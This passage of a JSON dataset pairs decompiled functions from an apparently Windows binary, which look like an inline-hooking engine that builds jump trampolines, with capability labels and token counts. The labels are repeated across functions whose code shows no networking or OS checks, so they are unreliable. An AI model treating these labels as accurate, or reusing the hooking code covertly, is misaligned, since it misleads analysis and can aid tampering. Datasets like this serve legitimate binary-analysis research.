0x18) || (iVar2 == 0xde)) {\n        if (*(arg1 + 0xcc) == '\\x04') {\n            *(arg1 + 0xcc) = 0x10;\n        }\n        else {\n            if (*(arg1 + 0xcc) != '\\x05') {\n                *(arg1 + 0x135) = 0;\n                *(arg1 + 0x136) = 1;\n                goto code_r0x00053eae;\n            }\n            *(arg1 + 0xcc) = 0x20;\n        }\n        *(arg1 + 0x135) = 1;\n        *(arg1 + 0x136) = 0;\n    }\n    else if (iVar2 == 0x220) {\n        uVar9 = fcn.00052668(uVar6 & 0xffffffffffffff00 | *(*(arg1 + 8) + 0x13a + arg1));\n        *(arg1 + 0xc0) = uVar9;\n    }\ncode_r0x00053eae:\n    if (*(arg1 + 0x128) != '\\0') {\n        fcn.000523a8(arg1);\n        *(arg1 + 8) = *(arg1 + 8) - *(arg1 + 0x18);\n        *(arg1 + 0x18) = 0;\n        cVar4 = fcn.0005247c(arg1);\n        *(arg1 + 0xd0) = cVar4;\n        if (cVar4 == 'f') {\n            *(arg1 + 0xc0) = 0x218;\n        }\n        else if (cVar4 == 'g') {\n            *(arg1 + 0xc0) = 0x217;\n        }\n        else {\n            *(arg1 + 0xc0) = 0x221;\n            *(arg1 + 200) = 0x8f;\n            *(arg1 + 0xcc) = 8;\n        }\n    }\n    *(arg1 + 0xa8) = 0;\n    *(arg1 + 0x40) = *(arg1 + 0xb0);\n    puVar10 = arg1 + 0x23a;\n    iVar8 = arg1 + 0x48;\n    if (*(arg1 + 0x18) != '\\0') {\n        do {\n            fcn.00066836(iVar8, 0x15e78, *puVar10);\n            uVar7 = uVar7 + 1;\n            iVar8 = iVar8 + 2;\n            puVar10 = puVar10 + 1;\n        } while (uVar7 < *(arg1 + 0x18));\n    }\n    *(arg1 + 0xb0) = *(arg1 + 0xb0) + *(arg1 + 0x18);\n    return;\n}\n",
        "token_count": 3779
    },
    "00053fb0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuchar fcn.00053fb0(int64_t arg1)\n\n{\n    int32_t iVar1;\n    \n    if ((*(arg1 + 8) != *(arg1 + 9)) || (*(arg1 + 0x30) == '\\0')) {\n        *(arg1 + 0x48) = 0;\n        *(arg1 + 0x68) = 0;\n        iVar1 = fcn.00053994(arg1);\n        if (iVar1 != 0) {\n            if (*(arg1 + 0x38) != NULL) {\n                (**(arg1 + 0x38))(arg1);\n            }\n            return *(arg1 + 0x18);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 160
    },
    "00054624": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00054624(int64_t arg1)\n\n{\n    uint64_t uVar1;\n    \n    uVar1 = 0;\n    if (*(arg1 + 0xb0) == 0) {\n        **(arg1 + 0x10) = **(arg1 + 0x28);\n    }\n    else if ((*(arg1 + 0xb0) == 1) && (*(arg1 + 8) != 0)) {\n        do {\n            *(uVar1 + *(arg1 + 0x10)) = *(*(arg1 + 0x18) + *(arg1 + 0x28) + uVar1);\n            uVar1 = uVar1 + 1;\n        } while (uVar1 < *(arg1 + 8));\n        return;\n    }\n    return;\n}\n",
        "token_count": 182
    },
    "000546e4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.000546e4(int64_t arg1, uint64_t arg2, ulong arg3, uint32_t *arg4)\n\n{\n    int32_t iVar1;\n    ulong uVar2;\n    uint32_t uVar3;\n    uchar auStack680 [192];\n    int32_t iStack488;\n    \n    if (*0x8d368 == 0) {\n        uVar2 = 0x21590001;\n    }\n    else if (arg1 == 0) {\n        uVar2 = 0x21590065;\n    }\n    else if (arg4 == NULL) {\n        uVar2 = 0x21590068;\n    }\n    else {\n        fcn.00053f78(auStack680);\n        fcn.00052628(auStack680);\n        fcn.00052648(auStack680, 0);\n        fcn.00052458(auStack680, arg1);\n        uVar3 = 0;\n        *arg4 = 0;\n        if (arg2 != 0) {\n            while ((arg3 == 0 || (*arg4 < arg3))) {\n                iVar1 = fcn.00053fb0(auStack680);\n                if ((iVar1 == 0) || ((*arg4 = *arg4 + 1,  iStack488 == 0x1be || (iStack488 == 0x1bf)))) break;\n                iVar1 = fcn.00052660(auStack680);\n                uVar3 = uVar3 + iVar1;\n                if (arg2 <= uVar3) break;\n            }\n        }\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 369
    },
    "000547bc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong * fcn.000547bc(ulong *arg1)\n\n{\n    ulong *puVar1;\n    \n    puVar1 = *arg1;\n    if (*(arg1 + 0x16) == 0) {\n        puVar1 = *puVar1;\n    }\n    return puVar1;\n}\n",
        "token_count": 68
    },
    "000547cc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.000547cc(ulong arg1, ulong arg2, int64_t arg3, uint64_t arg4)\n\n{\n    int64_t iVar1;\n    ulong uVar2;\n    uchar auVar3 [16];\n    uint64_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    int64_t arg1_00;\n    uint64_t arg1_01;\n    int64_t **ppiVar9;\n    int64_t **ppiVar10;\n    int32_t iVar11;\n    uchar (*pauVar12) [16];\n    uint64_t uVar13;\n    int64_t *piVar14;\n    uchar auStack120 [12];\n    uint uStack108;\n    ulong uStack104;\n    ulong auStack96 [4];\n    \n    uVar13 = arg2;\n    if (arg4 == 0) {\ncode_r0x000547f4:\n        iVar8 = 0x21590068;\n    }\n    else {\n        if (arg1 == 0) {\n            if (*(arg4 + 0xb8) == 0) goto code_r0x000547f4;\n            uVar13 = *(arg4 + 0x10);\n        }\n        else {\n            if (arg2 == 0) {\n                return 0x21590065;\n            }\n            if (arg3 == 0) {\n                return 0x21590067;\n            }\n        }\n        uVar5 = fcn.0004cb4c();\n        arg1_01 = uVar5 * 0x2c;\n        arg1_00 = fcn.00030cc4(arg1_01);\n        if (arg1_00 == 0) {\n            iVar8 = 0x21590004;\n        }\n        else {\n            uVar5 = fcn.0004cb4c();\n            uVar6 = fcn.0004cb4c();\n            uVar7 = fcn.0004cb4c();\n            ppiVar10 = arg1_00 + (uVar7 + uVar6) * 10;\n            iVar8 = fcn.0004cb4c();\n            uVar4 = 0;\n            if (iVar8 != 0) {\n                do {\n                    arg1_01 = uVar4;\n                    iVar11 = arg1_01;\n                    iVar8 = fcn.0004cb58(arg1_01, arg1_00 + arg1_01 * 10);\n                    if ((iVar8 != 0) ||\n                       (iVar8 = fcn.0004cb68(arg1_01, arg1_00 + uVar5 * 10 + arg1_01 * 10),  iVar8 != 0))\n                    goto code_r0x000549fd;\n                    uVar7 = iVar11 + 1;\n                    uVar6 = fcn.0004cb4c();\n                    uVar4 = uVar7;\n                } while (uVar7 < uVar6);\n            }\n            if (arg1 == 0) {\n                _auStack120 = *(arg4 + 0x70);\n            }\n            else {\n                pauVar12 = uVar13 * 0x10 + *(arg1_00 + 2);\n                auVar3 = *pauVar12;\n                arg1_01 = arg4;\n                fcn.0006677c(**pauVar12, arg4, 0, 0xe0);\n                *(arg4 + 0xb8) = arg3;\n                *(arg4 + 0xb0) = 0;\n                *(arg4 + 0x10) = uVar13;\n                uVar2 = *(*pauVar12 + 8);\n                stack0xffffffffffffff90 = SUB168(auVar3 >> 0x40, 0);\n                _auStack120 = CONCAT106(CONCAT82(stack0xffffffffffffff90, arg3 >> 0x10), \n                                        CONCAT24(0x8e00, CONCAT22(0x10, arg3)));\n                _auStack120 = _auStack120 & 0xffffffffffffffff;\n                *(arg4 + 0x70) = **pauVar12;\n                *(arg4 + 0x78) = uVar2;\n            }\n            uVar5 = 0;\n            iVar8 = fcn.0004cb4c();\n            if (iVar8 != 0) {\n                piVar14 = arg1_00 + 2;\n                ppiVar9 = ppiVar10;\n                do {\n                    iVar1 = *piVar14;\n                    *(ppiVar9 + 1) = _auStack120;\n                    uVar5 = uVar5 + 1;\n                    arg1_01 = iVar1 + uVar13 * 0x10;\n                    piVar14 = piVar14 + 10;\n                    *ppiVar9 = arg1_01;\n                    ppiVar9 = ppiVar9 + 3;\n                    uVar6 = fcn.0004cb4c();\n                } while (uVar5 < uVar6);\n            }\n            fcn.0001aac0(CONCAT71(arg1_01 >> 8, 2), auStack96, &uStack104);\n            uVar5 = 0;\n            iVar8 = fcn.0004cb4c();\n            if (iVar8 != 0) {\n                do {\n                    uVar5 = uVar5 + 1;\n                    piVar14 = **ppiVar10;\n                    **ppiVar10 = ppiVar10[1];\n                    (*ppiVar10)[1] = ppiVar10[2];\n                    ppiVar10 = ppiVar10 + 3;\n                    uVar6 = fcn.0004cb4c(piVar14);\n                } while (uVar5 < uVar6);\n            }\n            fcn.0001abd4(auStack96[0], uStack104);\n            iVar8 = 0;\ncode_r0x000549fd:\n            fcn.00030d24(arg1_00);\n        }\n    }\n    return iVar8;\n}\n",
        "token_count": 1347
    },
    "00054a20": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.00054a20(void)\n\n{\n    if (*0x8d368 == 0) {\n        return 0x21590064;\n    }\n    *0x8d330 = 1;\n    return 0;\n}\n",
        "token_count": 53
    },
    "00054a3c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00054a3c(void)\n\n{\n    if (*0x8d330 != 0) {\n        fcn.00030d24(*0x8d340);\n        *0x8d340 = 0;\n        *0x8d330 = 0;\n    }\n    return;\n}\n",
        "token_count": 69
    },
    "00054aac": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.00054aac(ulong arg1, uint64_t arg2, uint64_t *arg3, int64_t *arg4)\n\n{\n    ulong arg1_00;\n    int32_t iVar1;\n    int64_t iVar2;\n    ulong uVar3;\n    uint64_t uVar4;\n    int64_t *piVar5;\n    ulong *in_stack_00000028;\n    \n    *arg4 = 0;\n    arg2 = arg2 & 0xffffffff;\n    *in_stack_00000028 = 0;\n    if (arg1 == 1) {\n        piVar5 = fcn.00054574();\n        if (piVar5 == NULL) {\n            return 0xffffffff;\n        }\n    }\n    else {\n        if (arg1 != 2) {\n            return 0x21590065;\n        }\n        iVar2 = fcn.0005459c();\n        if (iVar2 == 0) {\n            return 0xffffffff;\n        }\n        uVar3 = fcn.00054190(arg4, in_stack_00000028);\n        if (uVar3 != 0) {\n            return uVar3;\n        }\n        piVar5 = iVar2 + 0x20;\n        arg2 = arg2 - 0x1000;\n    }\n    if (arg2 < piVar5[2] || arg2 == piVar5[2]) {\n        if ((*0x8d338 == 0) || (arg1 != 1)) {\n            *arg3 = *(*piVar5 + arg2 * 4);\n            iVar1 = fcn.000307e0();\n            if (iVar1 == 0x12) {\n                *arg3 = *arg3 & 0xfffffff0;\n            }\n            else {\n                iVar1 = fcn.000307e0();\n                if (0x26 < iVar1) {\n                    *arg3 = *(*piVar5 + arg2 * 4) >> 4;\n                }\n            }\n            uVar4 = *arg3 + *piVar5;\n        }\n        else {\n            uVar4 = *(*0x8d338 + arg2 * 8);\n        }\n        *arg3 = uVar4;\n        uVar3 = 0;\n    }\n    else {\n        iVar2 = *arg4;\n        arg1_00 = *in_stack_00000028;\n        uVar3 = 0x21590066;\n        if (iVar2 != 0) {\n            (*_fcn.000113d0)(arg1_00);\n            (*_fcn.000115b8)(iVar2);\n            fcn.00030d24(arg1_00);\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 592
    },
    "00054bd4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.00054bd4(int64_t arg1, int64_t arg2, uint64_t arg3, ulong arg4)\n\n{\n    int64_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    int64_t *arg1_00;\n    uchar *puVar5;\n    uint64_t uVar6;\n    int64_t iVar7;\n    uint64_t uVar8;\n    int64_t *apiStackX8 [4];\n    int64_t **in_stack_00000028;\n    uchar auStack712 [192];\n    int32_t iStack520;\n    int32_t iStack512;\n    char cStack508;\n    int32_t iStack504;\n    int32_t iStack496;\n    int32_t iStack492;\n    int32_t iStack480;\n    char cStack476;\n    uchar uStack472;\n    \n    uVar8 = 0;\n    if (arg1 == 0) {\n        return 0x21590065;\n    }\n    if (arg3 == 0) {\n        return 0x21590066;\n    }\n    if (in_stack_00000028 == NULL) {\n        return 0x2159006a;\n    }\n    arg1_00 = fcn.00030cc4(0xe0);\n    if (arg1_00 == NULL) {\n        return 0x21590004;\n    }\n    apiStackX8[0] = arg1_00;\n    fcn.0006677c(arg1_00, 0, 0xe0);\n    *(arg1_00 + 0x1b) = 1;\n    *(arg1_00 + 0xb4) = 0;\n    arg1_00[2] = arg1;\n    arg1_00[1] = 0;\n    arg1_00[6] = 0;\n    fcn.00053f78(auStack712);\n    fcn.00052628(auStack712);\n    fcn.00052648(auStack712, 0);\n    fcn.00052458(auStack712, arg1);\n    uVar6 = uVar8;\n    while ((arg1_00[1] < arg3 && (iVar2 = fcn.00053fb0(auStack712),  iVar2 != 0))) {\n        if ((iStack520 == 0x1be) || (iStack520 == 0x1bf)) {\n            return 0x2159000e;\n        }\n        uVar3 = fcn.00052660(auStack712);\n        uVar6 = uVar6 + uVar3;\n        arg1_00[1] = arg1_00[1] + uVar3;\n    }\n    iVar2 = fcn.00054670(arg1_00, uVar6 + 0xe);\n    if (iVar2 == 0) {\n        fcn.00052458(auStack712, arg1);\n        iVar7 = 0;\n        if (arg1_00[1] != 0) {\n            do {\n                iVar2 = fcn.00053fb0(auStack712);\n                if (iVar2 == 0) break;\n                if (iStack520 == 0xde) {\n                    if ((iStack512 == 0x90) && (cStack508 == '\\b')) {\n                        uVar3 = fcn.00052660(auStack712);\n                        iVar2 = fcn.00054670(arg1_00, (arg1_00[6] - uVar3) + 0xe);\n                        if (iVar2 == 0) {\n                            uVar3 = fcn.00052660(auStack712);\n                            puVar5 = *arg1_00 + iVar7;\n                            *puVar5 = 0xff;\n                            puVar5[1] = 0x25;\n                            *(puVar5 + 2) = 0;\n                            *(puVar5 + 6) = iStack504 + arg1 + uVar3 + uVar8;\n                            goto code_r0x00054dd4;\n                        }\n                        goto code_r0x00055058;\n                    }\ncode_r0x00054f9f:\n                    uVar4 = fcn.00052660(auStack712);\n                    fcn.0006670a(*arg1_00 + iVar7, arg1 + uVar8, uVar4);\ncode_r0x00054fbb:\n                    uVar3 = fcn.00052660(auStack712);\n                    uVar8 = uVar8 + uVar3;\n                    uVar3 = fcn.00052660(auStack712);\n                    iVar7 = iVar7 + uVar3;\n                }\n                else {\n                    if ((((((iStack520 == 0x232) || (iStack520 == 0xe5)) || (iStack520 == 0xe4)) ||\n                         ((iStack520 == 0xe2 || (iStack520 == 0x231)))) || (iStack520 == 0xe6)) &&\n                       ((iStack512 == 0x90 && (cStack508 == '\\b')))) {\n                        iVar2 = fcn.00054670(arg1_00, arg1_00[6] + 0xe);\n                        if (iVar2 == 0) {\n                            *(*arg1_00 + iVar7) = *(arg1 + uVar8);\n                            *(*arg1_00 + 1 + iVar7) = (*(arg1_00 + 6) - iVar7) + -0x10;\n                            uVar3 = fcn.00052660(auStack712);\n                            puVar5 = *arg1_00 + -0xe + arg1_00[6];\n                            *puVar5 = 0xff;\n                            puVar5[1] = 0x25;\n                            *(puVar5 + 2) = 0;\n                            *(puVar5 + 6) = iStack504 + arg1 + uVar3 + uVar8;\n                            goto code_r0x00054fbb;\n                        }\n                        goto code_r0x00055058;\n                    }\n                    if (((iStack520 != 0x31) || (((iStack512 != 0x8d || (iStack496 != 0x8b)) || (iStack492 != 0)))) ||\n                       (((cStack508 != ' ' || (iStack480 != 0x8f)) || (cStack476 != '\\b')))) goto code_r0x00054f9f;\n                    uVar3 = fcn.00052660(auStack712);\n                    iVar2 = fcn.00054670(arg1_00, (arg1_00[6] - uVar3) + 0xe);\n                    if (iVar2 != 0) goto code_r0x00055058;\n                    *(*arg1_00 + iVar7) = 0x50;\n                    *(*arg1_00 + 1 + iVar7) = 0x48;\n                    *(*arg1_00 + 2 + iVar7) = 0xa1;\n                    uVar3 = fcn.00052660(auStack712);\n                    *(*arg1_00 + 3 + iVar7) = iStack504 + arg1 + uVar3 + uVar8;\n                    *(*arg1_00 + 0xb + iVar7) = 0x3c;\n                    *(*arg1_00 + 0xc + iVar7) = uStack472;\n                    *(*arg1_00 + 0xd + iVar7) = 0x58;\n                    uVar3 = fcn.00052660(auStack712);\n                    uVar8 = uVar8 + uVar3;\ncode_r0x00054dd4:\n                    iVar7 = iVar7 + 0xe;\n                }\n            } while (uVar8 < arg1_00[1]);\n        }\n        iVar1 = arg1_00[1];\n        puVar5 = *arg1_00 + iVar7;\n        *puVar5 = 0xff;\n        puVar5[1] = 0x25;\n        *(puVar5 + 2) = 0;\n        *(puVar5 + 6) = iVar1 + arg1 + arg2;\n        if (arg4 != 0) {\n            uVar8 = arg1_00[1];\n            arg1_00[4] = uVar8;\n            if (uVar8 < 0x20) {\n                arg1_00[5] = arg1_00 + 0xe;\n            }\n            else {\n                iVar7 = fcn.00030cc4(uVar8);\n                arg1_00[5] = iVar7;\n                if (iVar7 == 0) {\n                    arg1_00[4] = 0;\n                    iVar2 = 0x21590004;\n                    goto code_r0x00055058;\n                }\n            }\n            fcn.0006670a(arg1_00[5], arg1, arg1_00[4]);\n            *(arg1_00 + 3) = 0;\n        }\n        *in_stack_00000028 = arg1_00;\n        iVar2 = 0;\n    }\n    else {\ncode_r0x00055058:\n        fcn.000545c4(apiStackX8);\n    }\n    return iVar2;\n}\n",
        "token_count": 2049
    },
    "000550f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.000550f0(int64_t arg1, int64_t arg2, ulong *arg3, ulong noname_3, ulong noname_4, ulong noname_5, \n                     ulong noname_6, ulong noname_7, ulong noname_8, ulong noname_9, ulong noname_10, ulong noname_11, \n                     ulong noname_12, ulong noname_13, ulong noname_14, ulong noname_15, ulong noname_16, \n                     ulong noname_17, ulong noname_18, ulong noname_19, ulong arg_b0h, ulong arg_b8h, ulong arg_c0h, \n                     ulong arg_c8h, ulong arg_d0h)\n\n{\n    int32_t *piVar1;\n    ulong *arg4;\n    int64_t *piVar2;\n    ulong *arg1_00;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint64_t uVar6;\n    ulong arg1_01;\n    int64_t *piVar7;\n    int64_t iVar8;\n    int64_t *piVar9;\n    ulong *puVar10;\n    uint64_t uVar11;\n    ulong uStackX24;\n    ulong uStackX32;\n    ulong var_58h;\n    ulong var_68h;\n    ulong *apuStack88 [3];\n    \n    uVar6 = 0;\n    uStackX32 = 0;\n    uStackX24 = 0;\n    if (arg3 == NULL) {\n        return 0x21590067;\n    }\n    *arg3 = 0;\n    if (arg1 == 0) {\n        return 0x21590065;\n    }\n    if (arg2 == 0) {\n        return 0x21590066;\n    }\n    if (*0x8d368 == 0) {\n        return 0x21590001;\n    }\n    apuStack88[0] = arg3;\n    uVar3 = fcn.0001aac0(CONCAT71(arg1 >> 8, 2), &uStackX32, &uStackX24);\n    uVar11 = uVar3;\n    if (uVar3 != 0) goto code_r0x000553ee;\n    iVar5 = 0x21590005;\n    if (*0x8d360 != 0) {\n        piVar7 = *0x8d358 + 8;\n        do {\n            if ((*piVar7 != 0) && (*(*piVar7 + 0x10) == arg1)) {\n                iVar8 = *(*0x8d358 + 8 + uVar6 * 0x10);\n                if (*(iVar8 + 0xb8) != arg2) {\n                    fcn.0001abd4(uStackX32, uStackX24);\n                    return 0x21590064;\n                }\n                piVar1 = iVar8 + 0xd8;\n                *piVar1 = *piVar1 + 1;\n                *arg3 = *(*0x8d358 + 8 + uVar6 * 0x10);\n                iVar5 = 0;\n                break;\n            }\n            uVar3 = uVar6 + 1;\n            uVar6 = uVar3;\n            piVar7 = piVar7 + 2;\n        } while (uVar3 < *0x8d360);\n    }\n    fcn.0001abd4(uStackX32, uStackX24);\n    if (iVar5 == 0) {\n        return 0;\n    }\n    if (*0x8d360 == 0xff) {\n        return 0x21590007;\n    }\n    uVar6 = fcn.00054bd4(arg1, 0, 4, 1);\n    arg1_00 = apuStack88[0];\n    if (uVar6 != 0) {\n        return uVar6;\n    }\n    piVar7 = apuStack88[0] + 0x17;\n    arg4 = apuStack88[0] + 0x1a;\n    apuStack88[0][0xb] = *apuStack88[0];\n    apuStack88[0][0xd] = apuStack88[0][6];\n    *piVar7 = arg2;\n    *(apuStack88[0] + 0x16) = 1;\n    apuStack88[0][0x19] = 4;\n    piVar2 = apuStack88[0] + 0x18;\n    *piVar2 = arg1;\n    uVar3 = *(apuStack88[0] + 0x19);\n    iVar8 = arg1;\n    uVar4 = fcn.0001ac10(arg1, uVar3, 2, arg4);\n    *piVar2 = arg1;\n    arg1_00[0x19] = uVar3;\n    uVar11 = uVar4;\n    if (uVar4 != 0) goto code_r0x000553ee;\n    uVar3 = fcn.0001aac0(CONCAT71(iVar8 >> 8, 2), &uStackX32, &uStackX24);\n    uVar11 = uVar3;\n    if (uVar3 == 0) {\n        arg1_01 = fcn.0001aa84();\n        uVar4 = *0x8d360;\n        uVar3 = 0;\n        if (*0x8d360 != 0) {\n            piVar9 = *0x8d358 + 8;\n            do {\n                if (*piVar9 == 0) break;\n                uVar3 = uVar3 + 1;\n                piVar9 = piVar9 + 2;\n            } while (uVar3 < uVar4);\n        }\n        puVar10 = arg1_00;\n        if (uVar3 < uVar4) {\ncode_r0x00055369:\n            uVar4 = fcn.0005507c(arg1_00);\n            uVar11 = uVar4;\n            if (uVar4 == 0) {\n                *(*0x8d358 + 8 + uVar3 * 0x10) = arg1_00;\n                *(*0x8d358 + uVar3 * 0x10) = *piVar7;\n                puVar10 = apuStack88[0];\n            }\n        }\n        else {\n            iVar5 = fcn.00031630(0x8d358, uVar4 << 4, uVar4 + 1 << 4);\n            if (iVar5 != -1) {\n                uVar3 = *0x8d360;\n                *0x8d360 = *0x8d360 + 1;\n                goto code_r0x00055369;\n            }\n            uVar11 = 0x21590004;\n            fcn.00054624(arg1_00);\n        }\n        fcn.0001aa94(arg1_01);\n        fcn.0001abd4(uStackX32, uStackX24);\n        if (uVar11 == 0) {\n            fcn.0001ac80(*piVar2, *arg4);\n            *piVar2 = 0;\n            arg1_00[0x19] = 0;\n            arg1_00[0x1a] = 0;\n            *arg3 = puVar10;\n            return uVar11;\n        }\n    }\n    fcn.0001ac80(*piVar2, *arg4);\ncode_r0x000553ee:\n    fcn.000545c4(apuStack88);\n    return uVar11;\n}\n",
        "token_count": 1711
    },
    "00055a44": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.00055a44(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    ulong uVar1;\n    int64_t iStackX32;\n    ulong uStack24;\n    \n    uVar1 = fcn.00054aac(arg1, arg2, arg3, &iStackX32);\n    if (uVar1 == 0) {\n        if (iStackX32 != 0) {\n            (*_fcn.000113d0)(uStack24);\n            (*_fcn.000115b8)(iStackX32);\n            fcn.00030d24(uStack24);\n        }\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 154
    },
    "00055a90": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00055a90(void)\n\n{\n    if (*0x8d368 != 0) {\n        fcn.00030d24(*0x8d358);\n        fcn.0005568c(0x8d320);\n        fcn.00030d24(*0x8d340);\n        fcn.00030d24(*0x8d338);\n        *0x8d368 = 0;\n    }\n    return;\n}\n",
        "token_count": 102
    },
    "00055adc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.00055adc(ulong noname_0, ulong noname_1, int64_t arg3, ulong *arg4)\n\n{\n    ulong uVar1;\n    \n    if (arg4 == NULL) {\n        uVar1 = 0x21590068;\n    }\n    else {\n        *arg4 = 0;\n        if (arg3 == 0) {\n            uVar1 = 0x21590067;\n        }\n        else if (*0x8d368 == 0) {\n            uVar1 = 0x21590001;\n        }\n        else if (*0x8d360 == -1) {\n            uVar1 = 0x21590007;\n        }\n        else {\n            uVar1 = fcn.00055928(noname_0, noname_1, arg3, arg4);\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 195
    },
    "00055b2c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.00055b2c(ulong param_1, ulong param_2, ulong param_3, ulong param_4)\n\n{\n    ulong uVar1;\n    \n    if (*0x8d368 == 0) {\n        uVar1 = 0x21590001;\n    }\n    else {\n        uVar1 = fcn.000559a8(param_1, param_2, param_3, param_4);\n    }\n    return uVar1;\n}\n",
        "token_count": 106
    },
    "00055b4c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.00055b4c(ulong param_1, ulong param_2, ulong param_3)\n\n{\n    ulong uVar1;\n    \n    if (*0x8d368 == 0) {\n        uVar1 = 0x21590001;\n    }\n    else {\n        uVar1 = fcn.00055a44(param_1, param_2, param_3);\n    }\n    return uVar1;\n}\n",
        "token_count": 97
    },
    "00055b6c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.00055b6c(ulong noname_0, int64_t *arg2)\n\n{\n    ulong uVar1;\n    \n    if (*0x8d330 == 0) {\n        uVar1 = 0x21590001;\n    }\n    else {\n        uVar1 = fcn.0005574c(noname_0, arg2);\n        if (uVar1 == 0) {\n            *(*arg2 + 0xb0) = 1;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 118
    },
    "00055ba4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.00055ba4(ulong noname_0, int64_t *arg2)\n\n{\n    ulong uVar1;\n    \n    if (*0x8d330 == 0) {\n        uVar1 = 0x21590001;\n    }\n    else {\n        uVar1 = fcn.000556d4(noname_0, arg2);\n        if (uVar1 == 0) {\n            *(*arg2 + 0xb0) = 1;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 117
    },
    "00055bdc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
